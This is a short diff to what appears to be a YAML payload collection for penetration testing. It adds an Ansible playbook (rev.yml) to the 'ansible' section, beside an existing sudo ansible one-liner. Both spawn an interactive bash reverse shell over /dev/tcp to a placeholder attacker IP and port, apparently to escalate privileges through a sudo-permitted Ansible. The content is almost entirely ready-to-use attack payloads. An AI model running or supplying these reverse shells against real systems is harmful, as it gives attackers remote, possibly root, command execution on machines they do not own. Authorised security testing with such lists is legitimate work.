@@ -1683,6 +1683,13 @@ payload:
   ansible:
     - |
       sudo ansible -m command localhost -a 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"'
+    - |
+      # Save as rev.yml
+
+      - hosts: localhost
+        tasks:
+        - name: rev
+          shell: bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
   php_lfi:
     - |
       # Examples (PHPINFO)
